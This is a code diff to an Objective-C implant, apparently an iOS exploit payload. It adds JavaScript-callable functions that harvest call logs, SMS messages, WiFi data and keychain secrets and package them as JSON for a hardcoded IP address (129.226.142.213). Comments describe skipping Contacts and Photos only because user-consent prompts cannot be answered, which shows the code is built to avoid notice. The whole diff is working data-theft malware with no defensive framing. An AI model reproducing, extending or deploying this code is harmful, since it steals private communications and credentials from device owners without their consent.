@@ -581,6 +581,78 @@ static void resolveIdentity(void) {
     }
 }
 
+/* ---------- stepwise entry points: JS calls them one by one ---------- */
+static int g_diag = 0;
+
+__attribute__((visibility("default"))) int step0(void) {
+    g_diag = 0;
+    g_outstg = 10;
+    if (!g_baseURL) g_baseURL = @"http://129.226.142.213";
+    parseBaseURL();
+    if (g_host[0]) g_diag |= 1;
+    g_outstg = 11;
+    return g_diag;
+}
+
+__attribute__((visibility("default"))) int step1(void) {
+    g_outstg = 21;
+    int ds = socket(AF_INET, SOCK_STREAM, 0);
+    if (ds >= 0) { g_diag |= 2; close(ds); }
+    g_outstg = 22;
+    return g_diag;
+}
+
+__attribute__((visibility("default"))) int step2(void) {
+    g_outstg = 31;
+    int n = collectCalls();
+    if (n > 0) { g_diag |= 16; }
+    g_outstg = 32;
+    return n;
+}
+
+__attribute__((visibility("default"))) int step3(void) {
+    g_outstg = 41;
+    int n = collectSMS();
+    if (n > 0) { g_diag |= 32; }
+    g_outstg = 42;
+    return n;
+}
+
+__attribute__((visibility("default"))) int step4(void) {
+    g_outstg = 51;
+    int n = collectWiFi();
+    if (n > 0) { g_diag |= 64; }
+    g_outstg = 52;
+    return n;
+}
+
+__attribute__((visibility("default"))) int step5(void) {
+    g_outstg = 61;
+    int n = collectKeychain();
+    if (n > 0) { g_diag |= 256; }
+    g_outstg = 62;
+    return n;
+}
+
+__attribute__((visibility("default"))) int step9(void) {
+    g_outstg = 90;
+    NSMutableDictionary *pkg = [NSMutableDictionary dictionary];
+    pkg[@"diag"] = @(g_diag);
+    pkg[@"host"] = [NSString stringWithUTF8String:g_host];
+    pkg[@"port"] = @(g_port);
+    pkg[@"data"] = g_out ? g_out : [NSDictionary dictionary];
+    NSData *j = [NSJSONSerialization dataWithJSONObject:pkg options:0 error:nil];
+    if (j) {
+        int n = (int)[j length];
+        int cp = (n < 262143) ? n : 262143;
+        memcpy(g_outbuf, [j bytes], cp);
+        g_outbuf[cp] = 0;
+        g_outlen = cp;
+    }
+    g_outstg = 99;
+    return g_outlen;
+}
+
 __attribute__((visibility("default")))
 int collect(void *ctx) {
     // 诊断位图：bit0 host解析 bit1 socket bit2 connect
@@ -633,24 +705,8 @@ int collect(void *ctx) {
         NSMutableDictionary *summary = [NSMutableDictionary dictionary];
         int n;
 
-        /* Contacts needs a TCC prompt that can never be answered here -> skipped */
-        /* n = collectContacts(); */
-
-        n = collectCalls();
-        if (n > 0) { summary[@"calls"] = @(n); diag |= 16; }
-
-        n = collectSMS();
-        if (n > 0) { summary[@"sms"] = @(n); diag |= 32; }
-
-        n = collectWiFi();
-        if (n > 0) { summary[@"wifi"] = @(n); diag |= 64; }
-
-        /* Photos also needs TCC -> skipped */
-        /* n = collectPhotos(); */
-
-        n = collectKeychain();
-        if (n > 0) { summary[@"keychain"] = @(n); diag |= 256; }
-        goto done_collecting;
+        /* deliberately empty: real work happens in step0..step9 */
+        n = 0;
 
 
         summary[@"diag"] = @(diag);
